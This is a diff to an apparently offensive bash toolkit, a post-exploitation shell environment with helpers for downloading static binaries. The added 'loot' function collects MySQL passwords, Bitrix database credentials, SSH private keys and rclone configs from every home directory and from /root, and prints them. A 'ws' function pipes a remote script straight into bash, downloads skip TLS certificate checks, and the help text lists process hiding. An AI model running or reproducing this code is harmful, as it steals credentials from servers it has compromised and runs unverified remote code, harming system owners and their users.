@@ -282,6 +282,7 @@ hs_mkhome() {
 
 # Keep this seperate because this actually creates data.
 mk() {
+    UHOME="${HOME}"
     export HOME="${XHOME}"
     echo -e "${CDM}HOME set to ${CDY}${XHOME}${CN}"
     echo -e "Undo with ${CDC}export HOME='${_HS_HOME_ORIG}'${CN}"
@@ -291,6 +292,16 @@ mk() {
 keep() {
     touch "${XHOME}/.keep" 2>/dev/null
     HS_INFO "Wont delete ${CDY}${XHOME}${CDM} on exit"
+}
+
+np() {
+    command -v noseyparker >/dev/null || { HS_ERR "Not found: noseyparker. Type ${CDC}bin${CN} first."; return 255;}
+	local d="/tmp/.np-${UID}-$$"
+	[ -d "${d}" ] && rm -rf "${d:?}"
+	[ $# -le 0 ] && set - .
+	NP_DATASTORE="$d" noseyparker -q scan "$1" >&2 || return
+	NP_DATASTORE="$d" noseyparker report --color=always
+	rm -rf "${d:?}"
 }
 
 bin() {
@@ -308,11 +319,14 @@ bin() {
     bin_dl() {
         local dst="${XHOME}/${1:?}"
         local str="${CDM}Downloading ${CDC}${1:?}${CDM}........................................"
+        local is_skip
         echo -en "${str:0:64}"
         [ -s "${dst}" ] || rm -f "${dst:?}" 2>/dev/null
-        command -v "${1}" >/dev/null   && { echo -e "[${CDY}SKIPPED${CDM}]${CN}"; return 0; }
-        { err=$(dl "${2:?}"  2>&1 >&3 3>&-); } >"${XHOME}/${1:?}" 3>&1 || { echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}${CN}"; return 255; }
-        chmod 711 "${XHOME}/${1}"
+        [ -z "$FORCE" ] && command -v "${1}" >/dev/null && is_skip=1
+        [ -n "$FORCE" ] && [ -s "$dst" ] && is_skip=1
+        [ -n "$is_skip" ] && { echo -e "[${CDY}SKIPPED${CDM}]${CN}"; return 0; }
+        { err=$(dl "${2:?}"  2>&1 >&3 3>&-); } >"${dst}" 3>&1 || { echo -e ".[${CR}FAILED${CDM}]${CN}${CF}\n---> ${2}\n---> ${err}${CN}"; return 255; }
+        chmod 711 "${dst}"
         echo -e ".....[${CDG}OK${CDM}]${CN}"
     }
 
@@ -336,12 +350,91 @@ bin() {
     bin_dl zgrep     "https://bin.ajam.dev/${a}/Baseutils/zgrep"
     bin_dl grep      "https://bin.ajam.dev/${a}/Baseutils/grep"
     bin_dl tar       "https://bin.ajam.dev/${a}/Baseutils/tar"
+    bin_dl sed       "https://bin.ajam.dev/${a}/Baseutils/secd"
     bin_dl nmap      "https://bin.ajam.dev/${a}/nmap"
     bin_dl tcpdump   "https://bin.ajam.dev/${a}/tcpdump"
+    [ "$arch" = "x86_64" ] && bin_dl noseyparker "https://github.com/hackerschoice/binary/raw/main/tools/noseyparker-x86_64-static"
 
-    echo -e ">>> ${CDG}Download COMPLETED${CN}"
+    [ -z "$FORCE" ] && echo -e ">>> Use ${CDC}FORCE=1 bin${CN} to force download even if systemwide exists" 
+    echo -e ">>> ${CDG}Download COMPLETE${CN}"
 
     unset -f bin_dl
+}
+
+loot_sshkey() {
+    local str="${CF}password protected"
+    local fn="${1:?}"
+
+    [ ! -s "${fn}" ] && return
+    grep -Fqam1 'PRIVATE KEY' "${fn}" || return
+
+    setsid -w ssh-keygen -y -f "${fn}" </dev/null &>/dev/null && str="${CDR}NO PASSWORD"
+    echo -e "${CB}SSH Key ${CDY}${fn}${CN} ${str}${CDY}${CF}"
+    cat "$fn"
+    echo -en "${CN}"
+}
+
+loot_bitrix() {
+    local fn="${1:?}"
+    [ ! -f "$fn" ] && return
+    grep -Fqam1 '$_ENV[' "$fn" && return
+    echo -e "${CB}Bitrix DB ${CDY}${fn}${CF}"
+    grep --color=never -E "(host|database|login|password)'.*=" "${fn}"
+    echo -en "${CN}"
+}
+
+loot() {
+    local h="${UHOME:-$HOME}"
+    local str
+
+    for fn in "${HOMEDIR:-/home}"/*/.my.cnf /root/.my.cnf; do
+        [ ! -s "$fn" ] && continue
+        echo -e "${CB}MySQL ${CDY}${fn}${CF}"
+        grep -vE "^(#|\[)" <"${fn}"
+        echo -en "${CN}"
+        # grep -E "^(user|password)" "${h}/.my"
+    done
+    for fn in "${HOMEDIR:-/home}"/*/.mysql_history /root/.mysql_history; do
+        [ ! -s "$fn" ] && continue
+        str=$(grep -ia '^SET PASSWORD FOR' "$fn") || continue
+        echo -e "${CB}MySQL ${CDY}${fn}${CF}"
+        echo "$str"
+        echo -en "${CN}"
+    done
+
+    ### Bitrix
+    for fn in "${HOMEDIR:-/home}"/*/*/bitrix/.settings.php; do
+        loot_bitrix "$fn"
+    done
+
+    find /var/www -maxdepth 6 -type f -wholename "*/bitrix/.settings.php" | while read -r fn; do
+        loot_bitrix "$fn"
+    done
+
+    ### SSH Keys
+    [ -e "/etc/ansible/ansible.cfg" ] && {
+        str="$(grep ^private_key_file "/etc/ansible/ansible.cfg")"
+        s="${str##*= }"
+        loot_sshkey "$s"
+    }
+
+    for fn in "${HOMEDIR:-/home}"/*/.ssh/* /root/.ssh/*; do
+        loot_sshkey "$fn"
+    done
+
+    ### .config
+    for fn in "${HOMEDIR:-/home}"/*/.config/rclone/rclone.conf /root/.config/rclone/rclone.conf; do
+        [ ! -s "$fn" ] && continue
+        echo -e "${CB}rclone ${CDY}${fn}${CF}"
+        cat "$fn"
+        echo -en "${CN}"
+    done
+
+    HS_WARN "FIXME: This is ALPHA. Needs much more..."
+}
+
+ws() {
+    dl https://thc.org/ws | bash
 }
 
 hs_exit() {
@@ -361,21 +454,18 @@ hs_exit() {
 
 [ -z "$BASH" ] && TRAPEXIT() { hs_exit; } #zsh
 
+### Functions (temporary)
 hs_init_dl() {
+    # Ignore TLS certificate. This is DANGEROUS but many hosts have missing ca-bundles or TLS-Proxies.
     if command -v curl >/dev/null; then
-        dl() {
-            curl -fsSLk --proto-default https --connect-timeout 7 --retry 3 "${1:?}"
-        }
+        dl() { curl -fsSLk --proto-default https --connect-timeout 7 --retry 3 "${1:?}";}
     elif command -v wget >/dev/null; then
         dl() { wget -Op --no-check-certificate --connect-timeout=7 --dns-timeout=7 "${1:?}";}
     else
-        dl() {
-            HS_ERR "Not found: curl"
-        }
+        dl() { HS_ERR "Not found: curl"; }
     fi
 }
 
-### Functions (temporary)
 hs_init() {
     local a
     local prg="$1"
@@ -458,6 +548,9 @@ ${CDC} find_subdomain .foobar.com            ${CDM}Search files for sub-domain
 ${CDC} crt foobar.com                        ${CDM}Query crt.sh for all sub-domains
 ${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple public databases
 ${CDC} hide <pid>                            ${CDM}Hide a process
+${CDC} np <directory>                        ${CDM}Display secrets with NoseyParker ${CN}${CF}[try |less -R]
+${CDC} loot                                  ${CDM}Display common secrets
+${CDC} ws                                    ${CDM}WhatServer - display server's essentials
 ${CDC} bin                                   ${CDM}Download useful static binaries
 ${CDC} xhelp                                 ${CDM}This help"
     echo -e "${CN}"
